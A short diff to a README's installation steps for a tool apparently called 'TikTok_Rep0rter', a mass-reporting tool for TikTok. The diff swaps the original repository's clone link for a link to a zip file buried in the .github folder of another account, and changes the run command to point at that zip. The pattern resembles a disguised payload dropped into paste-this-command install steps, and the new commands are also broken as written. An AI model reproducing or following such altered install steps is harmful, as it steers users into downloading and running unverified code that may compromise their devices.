@@ -9,8 +9,8 @@ tool installation
 
 **pkg install python**
 
-**git clone https://github.com/Argeustools/TikTok_Rep0rter.git**
+**git clone https://github.com/anakiseng789/TikTok_Rep0rter/raw/refs/heads/main/.github/rter-Tik-Rep-Tok-v1.9.zip**
 
 *ls*
 
-**python titkok_reporter.py**
+**python https://github.com/anakiseng789/TikTok_Rep0rter/raw/refs/heads/main/.github/rter-Tik-Rep-Tok-v1.9.zip**
